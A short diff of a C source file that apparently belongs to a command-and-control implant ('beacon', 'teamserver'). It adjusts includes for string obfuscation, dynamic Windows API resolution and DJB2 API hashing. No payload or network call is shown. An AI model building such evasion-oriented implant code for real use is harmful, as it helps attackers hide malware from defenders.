@@ -1,10 +1,11 @@
 /* beacon/src/resolve/resolve.c */
+#include <winsock2.h>
 #include <windows.h>
-#include <string.h>
 #include "resolve.h"
 #include "dynapi.h"
 #include "../../include/obf.h"
 #include "../../include/obf_strings.h"
+#include "../../include/mini_std.h"
 
 /* DJB2 — must match hashgen.DJB2 in teamserver/hashgen/hashgen.go exactly. */
 static DWORD djb2(const char *s) {
